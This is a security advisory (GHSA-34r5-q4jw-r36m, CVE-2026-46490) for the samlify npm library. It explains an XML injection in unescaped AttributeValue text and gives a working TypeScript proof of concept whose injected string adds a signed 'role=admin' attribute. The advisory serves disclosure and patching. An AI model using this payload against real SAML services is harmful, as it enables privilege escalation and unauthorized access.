# [H] samlify: XML Injection in AttributeValue Allows Privilege Escalation in Signed SAML Assertions

## Summary
Severity: High
Advisory: GHSA-34r5-q4jw-r36m
CVE: CVE-2026-46490
CWE: CWE-91
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-21
Source: https://github.com/advisories/GHSA-34r5-q4jw-r36m
Type: github-advisory

## Affected
- npm: `samlify` — affected >=0 <2.13.0

## Details
## Summary

samlify’s template substitution only escapes attribute contexts. Values inserted into element text (e.g., `<saml:AttributeValue>`) are not escaped. A normal user can inject XML markup into an attribute value (e.g., email, name) and add new `<saml:Attribute>` elements inside the signed assertion. The IdP then signs the tampered assertion and the SP accepts the injected attributes as trusted. This allows privilege escalation when attributes are used for authorization (roles/groups).

## Root Cause

`src/libsaml.ts` → `replaceTagsByValue()` only escapes placeholders when preceded by a quote (attribute context). Element text is inserted raw. The attribute builder inserts placeholders into element text:

```
<saml:AttributeValue ...>{attrUserX}</saml:AttributeValue>
```

Therefore, `</saml:AttributeValue>…<saml:Attribute …>` is accepted and signed.

## Proof-of-concept

- poc/attribute_injection.ts

```TS
import { readFileSync } from 'fs';
import * as samlify from '../index';
import * as validator from '@authenio/samlify-xsd-schema-validator';

samlify.setSchemaValidator(validator);

const { IdentityProvider, ServiceProvider, SamlLib: libsaml, Utility: util } = samlify as any;

const loginResponseTemplate = {
  context: '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="{ID}" Version="2.0" IssueInstant="{IssueInstant}" Destination="{Destination}" InResponseTo="{InResponseTo}"><saml:Issuer>{Issuer}</saml:Issuer><samlp:Status><samlp:StatusCode Value="{StatusCode}"/></samlp:Status><saml:Assertion ID="{AssertionID}" Version="2.0" IssueInstant="{IssueInstant}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Issuer>{Issuer}</saml:Issuer><saml:Subject><saml:NameID Format="{NameIDFormat}">{NameID}</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="{SubjectConfirmationDataNotOnOrAfter}" Recipient="{SubjectRecipient}" InResponseTo="{InResponseTo}"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="{ConditionsNotBefore}" NotOnOrAfter="{ConditionsNotOnOrAfter}"><saml:AudienceRestriction><saml:Audience>{Audience}</saml:Audience></saml:AudienceRestriction></saml:Conditions>{AttributeStatement}</saml:Assertion></samlp:Response>',
  attributes: [
    { name: 'mail', valueTag: 'user.email', nameFormat: 'urn:oasis:names:tc:SAML:2.0:attrname-format:basic', valueXsiType: 'xs:string' },
    { name: 'injection', valueTag: 'user.injection', nameFormat: 'urn:oasis:names:tc:SAML:2.0:attrname-format:basic', valueXsiType: 'xs:string' },
  ],
};

const idp = IdentityProvider({
  privateKey: readFileSync('./test/key/idp/privkey.pem'),
  privateKeyPass: 'q9ALNhGT5EhfcRmp8Pg7e9zTQeP2x1bW',
  isAssertionEncrypted: false,
  metadata: readFileSync('./test/misc/idpmeta.xml'),
  loginResponseTemplate,
});

const sp = ServiceProvider({
  privateKey: readFileSync('./test/key/sp/privkey.pem'),
  privateKeyPass: 'VHOSp5RUiBcrsjrcAuXFwU1NKCkGA8px',
  isAssertionEncrypted: false,
  metadata: readFileSync('./test/misc/spmeta.xml'),
});

const buildTemplate = (_idp: any, _sp: any, _binding: any, user: any) => (template: string) => {
  const now = new Date();
  const fiveMinutesLater = new Date(now.getTime() + 300_000);
  const tvalue = {
    ID: _idp.entitySetting.generateID(),
    AssertionID: _idp.entitySetting.generateID(),
    Destination: _sp.entityMeta.getAssertionConsumerService('post'),
    Audience: _sp.entityMeta.getEntityID(),
    SubjectRecipient: _sp.entityMeta.getAssertionConsumerService('post'),
    NameIDFormat: 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress',
    NameID: user.email,
    Issuer: _idp.entityMeta.getEntityID(),
    IssueInstant: now.toISOString(),
    ConditionsNotBefore: now.toISOString(),
    ConditionsNotOnOrAfter: fiveMinutesLater.toISOString(),
    SubjectConfirmationDataNotOnOrAfter: fiveMinutesLater.toISOString(),
    InResponseTo: 'request-id',
    StatusCode: 'urn:oasis:names:tc:SAML:2.0:status:Success',
    attrUserEmail: user.email,
    attrUserInjection: user.injection,
  };

  return { id: tvalue.ID, context: libsaml.replaceTagsByValue(template, tvalue) };
};

async function main() {
  const injection = [
    'safe',
    '</saml:AttributeValue></saml:Attribute>',
    '<saml:Attribute Name="role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">',
    '<saml:AttributeValue xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">admin</saml:AttributeValue>',
    '</saml:Attribute>',
    '<saml:Attribute Name="injection" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">',
    '<saml:AttributeValue xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">safe'
  ].join('');

  const user = { email: 'user@esaml2.com', injection };
  const { context: SAMLResponse } = await idp.createLoginResponse(
    sp,
    { extract: { request: { id: 'request-id' } } },
    'post',
    user,
    buildTemplate(idp, sp, 'post', user)
  );

  const xml = util.base64Decode(SAMLResponse, true).toString();
  console.log('--- Generated XML snippet ---');
  console.log(xml.slice(xml.indexOf('<saml:AttributeStatement'), xml.indexOf('</saml:AttributeStatement>') + 26));

  const { extract } = await sp.parseLoginResponse(idp, 'post', { body: { SAMLResponse } });

  console.log('Parsed attributes:', extract.attributes);
}

main().catch(err => {
  console.error('PoC failed:', err?.message || err);
  process.exitCode = 1;
});
```

**Run:**

```
  npm install --legacy-peer-deps
  npx ts-node poc/attribute_injection.ts
```

## Impact 

A normal user can inject arbitrary attributes (e.g., `role=admin`) into a signed assertion and have them parsed by `sp.parseLoginResponse()`. This can grant elevated privileges in SPs that trust SAML attributes.

## References
- https://github.com/tngan/samlify/security/advisories/GHSA-34r5-q4jw-r36m
- https://nvd.nist.gov/vuln/detail/CVE-2026-46490
- https://github.com/tngan/samlify
